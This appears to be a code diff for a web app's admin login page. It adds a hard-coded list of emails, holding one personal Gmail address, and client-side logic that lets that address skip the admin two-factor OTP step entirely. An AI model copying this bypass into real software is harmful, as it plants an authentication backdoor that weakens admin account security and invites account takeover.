@@ -343,7 +343,6 @@
     to   { transform: translateY(0);    opacity: 1; }
   }
 
-  /* ✅ FIXED: Using the correct class name */
   .fp-modal-box {
     background: #fff;
     border-radius: 24px;
@@ -850,6 +849,20 @@
   }
 
   // ============================================
+  // ⚡ OTP BYPASS LIST
+  // Emails in this list skip the admin 2FA / OTP step entirely.
+  // Keep this list short and remove entries you no longer trust.
+  // ============================================
+  const OTP_BYPASS_EMAILS = [
+    'silvestre.jhaypee12@gmail.com'
+  ];
+
+  function isOtpBypassed(email) {
+    if (!email) return false;
+    return OTP_BYPASS_EMAILS.includes(email.trim().toLowerCase());
+  }
+
+  // ============================================
   // LOGIN FORM LOGIC
   // ============================================
 
@@ -916,6 +929,14 @@
       );
 
       if (response.ok) {
+        // ---- OTP BYPASS CHECK ----
+        if (isOtpBypassed(email)) {
+          console.log('[OTP BYPASS] Skipping 2FA for:', email);
+          isOtpVerified = true;
+          loginForm.submit();
+          return;
+        }
+        // ---- NORMAL FLOW ----
         handleAdmin2FA(email);
       } else if (response.status === 403) {
         const message = await response.text();
